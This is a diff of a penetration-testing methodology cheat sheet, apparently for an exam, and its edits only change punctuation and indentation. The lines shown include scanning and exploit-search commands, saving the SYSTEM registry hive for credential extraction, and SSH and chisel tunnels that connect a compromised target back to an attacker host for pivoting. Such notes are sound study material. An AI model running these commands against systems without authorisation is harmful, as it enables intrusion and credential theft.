@@ -1,9 +1,9 @@
-# Attack Methodology — Master Flowchart
+# Attack Methodology - Master Flowchart
 
 ## Phase 1: Initial Enumeration
 
 ```bash
-# Fast scan — get something to work with immediately
+# Fast scan - get something to work with immediately
 nmap -sC -sV -oA nmap/initial <target>
 
 # Full TCP port scan
@@ -77,16 +77,16 @@ Full web attack flow → [[Web-Methodology]]
 searchsploit <service> <version>
 # Copy exploit locally:
 searchsploit -m <exploit-id>
-# Read the exploit code BEFORE running it — check for hardcoded IPs, ports, paths
+# Read the exploit code BEFORE running it - check for hardcoded IPs, ports, paths
 ```
 3. Check Google: `<service> <version> exploit PoC github`
-4. If web app — check for injection, upload, auth bypass
-5. If creds found — try them everywhere ([[Im-Stuck]])
+4. If web app - check for injection, upload, auth bypass
+5. If creds found - try them everywhere ([[Im-Stuck]])
 6. **READ THE EXPLOIT CODE.** Blind-running exploits wastes hours. Check:
-   - Does it need a target URL/IP edited?
-   - Does it need a different Python version? (`python2` vs `python3`)
-   - Does it create a reverse shell or just prove the vuln?
-   - Missing dependencies? `pip install -r requirements.txt`
+ - Does it need a target URL/IP edited?
+ - Does it need a different Python version? (`python2` vs `python3`)
+ - Does it create a reverse shell or just prove the vuln?
+ - Missing dependencies? `pip install -r requirements.txt`
 
 ---
 
@@ -139,7 +139,7 @@ reg save HKLM\SYSTEM sys.bak
 
 ## Phase 7: Active Directory (if applicable)
 
-AD environments require a different approach — lateral movement + credential harvesting across machines.
+AD environments require a different approach - lateral movement + credential harvesting across machines.
 
 → [[AD-Methodology]]
 
@@ -159,8 +159,8 @@ ssh -D 9050 user@<compromised>
 proxychains nmap -sT <internal-target>
 
 # Chisel
-./chisel server -p 8080 --reverse   # on attacker
-./chisel client <attacker>:8080 R:socks  # on target
+./chisel server -p 8080 --reverse # on attacker
+./chisel client <attacker>:8080 R:socks # on target
 ```
 
 ---
@@ -175,6 +175,6 @@ For every machine, record:
 - Screenshots with proof commands
 - Flags obtained
 
-This is your report material. Do it as you go — not after.
+This is your report material. Do it as you go - not after.
 
 See [[Exam-Day-Checklist]] for screenshot requirements.
